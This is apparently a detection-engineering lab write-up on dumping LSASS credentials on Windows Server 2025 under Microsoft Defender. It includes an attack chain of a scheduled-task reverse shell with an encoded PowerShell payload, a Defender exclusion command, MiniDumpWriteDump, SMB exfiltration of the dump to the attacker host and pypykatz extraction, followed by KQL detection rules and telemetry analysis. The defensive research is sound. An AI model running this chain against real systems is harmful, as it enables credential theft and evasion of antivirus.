# LSASS Credential Dump | Windows Server 2025 | Detection Engineering

## Research Scope
This writeup focuses on detection engineering and Microsoft Defender telemetry behaviour, not tool development. The technique is described at the API level using publicly documented Windows functionality. No tooling or compiled binaries are provided. No vulnerability or security boundary bypass was identified. This research examines how Defender responds to specific credential access patterns and where visibility diverges from enforcement. The goal is to clarify detection boundaries for defenders.
Assumed breach is the starting point by design. The research question is not whether compromise is possible but what the defensive stack observes once it has occurred. Lab constraints (VM, no TPM/Secure Boot, no Credential Guard) are documented explicitly. Findings are scoped to the configurations tested. Defenders operating hardened environments with additional controls may observe different outcomes — those configurations represent separate research questions outside this scope.

---

## Overview

Extension of Vector 7 (Server 2022). Same technique, different target OS.

**Key result:** Full credential extraction on Windows Server 2025 default install with Microsoft Defender enabled.

**Key observation:** Defender generates telemetry for LSASS access (EID 10) but does not alert on it under default configuration.

**Dependency identified:** Successful extraction requires a Defender exclusion path. Removal of the exclusion triggers immediate detection (`Trojan:Win32/LsassDump.A`).

**Tooling note:** pypykatz 0.6.10 fails on Server 2025 (`lsasrv.dll` signature gap). **0.6.13 required.**

---

## Lab Environment

| Host | Role | IP |
|------|------|----|
| Kali | Attacker | 192.168.1.218 |
| WIN-A33E3D6C61G | Target (Server 2025 DC) | 192.168.1.95 |
| ELK | SIEM | 192.168.1.250 |

**Target configuration:**

| Variable | Value |
|---|---|
| OS | Windows Server 2025 Datacenter 24H2 |
| Build | 26100 |
| UBR | 1 (unpatched) |
| Defender Engine | 4.18.26030.3011 |
| Defender Sigs | 1.449.312.0 (current) |
| AMRunningMode | Normal |
| Credential Guard | NOT enabled |
| PPL | Not enabled |
| Sysmon | 15.20 (SwiftOnSecurity + lsass EID 10 rule) |
| Winlogbeat | 8.19.14 → ELK 192.168.1.250 |

---

## Attack Chain

**Delivery:** goexec tsch scheduled task → SYSTEM reverse shell

```bash
# [Kali]
./goexec tsch create 192.168.1.95 \
  -u administrator@lab2019.local \
  -p 'PASSWORD' \
  --task '\systemshell' \
  --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
  --args "-NoP -NonI -W Hidden -Enc $ENCODED"
```

**Exclusion:**
```powershell
# [WIN-A33E3D6C61G]
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

**Execution:**
```
c:\windows\tasks\curio.exe
```
- Binary: compiled C# calling `MiniDumpWriteDump` from `dbghelp.dll` via P/Invoke
- Output: `C:\Windows\Temp\out2.dmp`
- Result: `True`

**Exfil:**
```bash
# [Kali]
smbclient //192.168.1.95/C$ -U 'Administrator%PASSWORD' \
  -c 'get Windows\Temp\out2.dmp /tmp/out2_server2025.dmp'
```

**Extraction:**
```bash
# [Kali] — pypykatz 0.6.13 required (0.6.10 fails on Server 2025)
pypykatz lsa minidump /tmp/out2_server2025.dmp
```

---

## Results

| Variable | Run 1 (direct) | Run 2 (rev shell) |
|---|---|---|
| Dump size | ~131MB | ~131–251MB |
| Write time | ~8 min | ~24–32 min |
| Administrator NT | [redacted] | ✅ same |
| Machine account NT | [redacted] | ✅ same |
| Kerberos plaintext | ✅ extracted | ✅ extracted |
| AES128/256 keys | ✅ extracted | ✅ extracted |
| DPAPI master keys | ✅ extracted | ✅ extracted |

**pypykatz note:** 0.6.10 returns `lsasrv.dll signature not found` on Server 2025. Upgrade to 0.6.13 before running against Server 2025 dumps.

---

## Telemetry

### EID 10 — curio.exe → lsass.exe

Two access events fired at dump initiation:

| SourceImage | GrantedAccess | CallTrace |
|---|---|---|
| `C:\windows\tasks\curio.exe` | `0x1FFFFF` | `ntdll → KERNEL32 → dbgcore.DLL → MiniDumpWriteDump` |
| `C:\windows\tasks\curio.exe` | `0x1F3FFF` | `ntdll → System.ni.dll (.NET P/Invoke resolution)` |

`0x1FFFFF` = PROCESS_ALL_ACCESS — MiniDumpWriteDump acquisition  
`0x1F3FFF` = .NET runtime P/Invoke handle resolution prior to native call

**No Kibana alert fired** on either event. Existing rules caught the delivery chain (Base64 encoded payload, binary execution from Tasks) but not the lsass access itself.

### EID 5007 — Defender exclusion

`Add-MpPreference -ExclusionPath "C:\Windows\Temp"` fires EID 5007 in the Defender Operational log. This is the most actionable precursor signal in the chain — it fires before the dump completes.

---

## Detection Rule (KQL)

Validated in Kibana against lab telemetry — 1 result, curio.exe → lsass.exe, `0x1FFFFF`.

```kql
event.code: "10" and
message: "lsass.exe" and
message: "0x1FFFFF" and
not message: ("MsMpEng" or "csrss.exe" or "wininit.exe" or "svchost.exe" or "wmiprvse.exe")
```

**Mapping note:** In Winlogbeat 8.19.x, `winlog.event_data.GrantedAccess` is indexed as `text` rather than `keyword`, so field-level KQL matching on that field is not functional. This rule uses `message` content matching as a confirmed workaround. Defenders on index templates with `keyword` mapping for that field can use the field-level form instead:

```kql
event.code: "10" and
winlog.event_data.TargetImage: "*lsass*" and
winlog.event_data.GrantedAccess: ("0x1fffff" or "0x1f3fff") and
not winlog.event_data.SourceImage: (
  "*MsMpEng*" or "*svchost*" or "*wmiprvse*" or
  "*lsass*" or "*csrss*" or "*wininit*"
)
```

**Note:** `0x1FFFFF` is common but not the only access mask `MiniDumpWriteDump` may request — the `dbgcore.DLL` CallTrace anchor is more durable across technique variants than the access mask value. This rule is validated against a specific lab configuration (Winlogbeat 8.19.x, SwiftOnSecurity Sysmon config). Tune the exclusion list for your environment — legitimate processes touching lsass vary by OS version, installed software, and EDR. YMMV.

---

## Comparison vs Server 2022

| Variable | Server 2022 | Server 2025 |
|---|---|---|
| Chain succeeds | ✅ | ✅ |
| Credential Guard | Not enabled | Not enabled |
| PPL | Not enabled | Not enabled |
| Write time (direct) | 30–45 min | ~8 min |
| Write time (rev shell) | 30–45 min | ~24–32 min |
| pypykatz version needed | 0.6.10 | **0.6.13 minimum** |
| EID 10 captured | Non-deterministic | ✅ confirmed |
| Alert on lsass access | ❌ | ❌ |

Server 2025 dumps significantly faster than Server 2022 under identical conditions, suggesting a difference in Defender's runtime interference behaviour under identical dump conditions.

---

## Defensive Takeaway

Detection does not reliably occur at the point of credential access.

**Primary detection opportunity:**  
`Add-MpPreference -ExclusionPath` (EID 5007)

This is not an operational convenience — it is a **functional dependency** of the attack chain.

- The dump file is removed immediately as `Trojan:Win32/LsassDump.A` once the exclusion is lifted
- EID 5007 fires on both addition and removal of the exclusion
- Both events occur **before or during credential material exposure**

**Implication:**  
Defenders should treat Defender exclusion changes as high-signal events, particularly when originating from scheduled tasks, scripting engines, or non-interactive contexts.

Catching LSASS access may fail.  
Catching the **conditions required to make it succeed** is more reliable.

**No exploit. No bypass. Default behavior — gated by a removable dependency.**

---

*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*

*Lab-validated on Windows Server 2025 Datacenter 24H2, UBR 1, Defender 4.18.26030.3011 with current signatures. April 2026.*

<img width="1865" height="951" alt="attackredacted" src="https://github.com/user-attachments/assets/dca70990-62e7-4e67-bbce-bbfa14995b10" />
<img width="1687" height="625" alt="kql" src="https://github.com/user-attachments/assets/1e16572d-0e51-43c9-9305-cc9bd12b9f77" />
<img width="1651" height="640" alt="5007b" src="https://github.com/user-attachments/assets/78a438d2-aee8-44d3-b15b-17ad492169df" />
<img width="1680" height="384" alt="5007" src="https://github.com/user-attachments/assets/1574320c-4a10-443d-9269-53e7ecb0f657" />

Remove the exclusion before deleting the dump and Defender breaks its silence upon file selection / deletion — immediately.

<img width="1206" height="392" alt="image" src="https://github.com/user-attachments/assets/424dbcbc-9b4a-45e3-9cfd-249e35a475f1" />

---
